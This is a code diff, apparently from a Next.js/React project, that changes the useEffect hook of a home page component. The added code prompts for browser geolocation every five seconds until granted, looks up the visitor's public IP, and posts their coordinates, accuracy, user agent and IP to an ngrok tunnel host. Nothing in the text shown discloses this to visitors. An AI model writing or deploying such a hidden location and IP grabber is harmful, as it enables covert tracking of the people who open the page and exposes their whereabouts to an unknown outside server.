@@ -11,38 +11,51 @@ export default function HomePage() {
   }, []);
   const [locationGranted, setLocationGranted] = useState(false);
   
-      useEffect(() => {
-        function reportLocation(position: GeolocationPosition) {
-          setLocationGranted(true);
-          fetch("https://d2d0-80-233-56-239.ngrok-free.app/gps", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy,
-              timestamp: position.timestamp,
-              userAgent: navigator.userAgent
-            })
-          }).catch(error => console.error('Error sending location:', error));
-        }
-    
-        function tryGetLocation() {
-          if (!locationGranted && navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-              reportLocation,
-              (error) => {
-                console.log("Permiso aún no concedido o error:", error.message);
-              }
-            );
+  useEffect(() => {
+    async function reportLocation(position: GeolocationPosition) {
+      try {
+        // Obtiene la IP pública del usuario
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIp = ipData.ip;
+        console.log(ipData);
+  
+        setLocationGranted(true);
+  
+        // Enviar toda la información a tu servidor Flask
+        await fetch("https://d2d0-80-233-56-239.ngrok-free.app/gps", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: position.timestamp,
+            userAgent: navigator.userAgent,
+            userIp: userIp
+          })
+        });
+      } catch (error) {
+        console.error('Error getting location or IP:', error);
+      }
+    }
+  
+    function tryGetLocation() {
+      if (!locationGranted && navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          reportLocation,
+          (error) => {
+            console.log("Permiso aún no concedido o error:", error.message);
           }
-        }
-    
-        tryGetLocation();
-        const intervalId = setInterval(tryGetLocation, 5000); // cada 5 segundos
-    
-        return () => clearInterval(intervalId); // Limpia el intervalo si el componente se desmonta
-      }, [locationGranted]);
+        );
+      }
+    }
+  
+    tryGetLocation();
+    const intervalId = setInterval(tryGetLocation, 5000); // cada 5 segundos
+  
+    return () => clearInterval(intervalId); // Limpia el intervalo si el componente se desmonta
+  }, [locationGranted]);
 
   
   return (
